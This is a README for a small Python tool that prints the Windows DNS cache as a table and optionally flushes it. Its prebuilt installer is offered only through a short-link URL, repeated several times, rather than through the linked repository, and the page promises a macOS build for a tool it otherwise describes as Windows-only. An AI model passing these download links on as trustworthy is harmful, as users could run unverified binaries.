![DNS Cache List](assets/hero.png)

# DNS Cache List

*ipconfig /displaydns as a table.*

## What DNS Cache List is

**DNS Cache List** runs on your own PC. Print the Windows DNS cache as name, type, and record, or flush after a preview count.

displaydns is unreadable. A flush should show how many records went.

Use it when you want the change on this machine without opening a dozen Settings pages.

## What's included

Two editions of the same tool:

- **CLI** — the source in this repo. Python 3.11+, local files only.
- **Desktop build** — Windows / macOS installer on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8).

## What it does

- Table
- Optional flush
- Count first
- No hosts file edits

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Install

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/jare-kim3977/dns-cache-list

MIT license. See `LICENSE`.
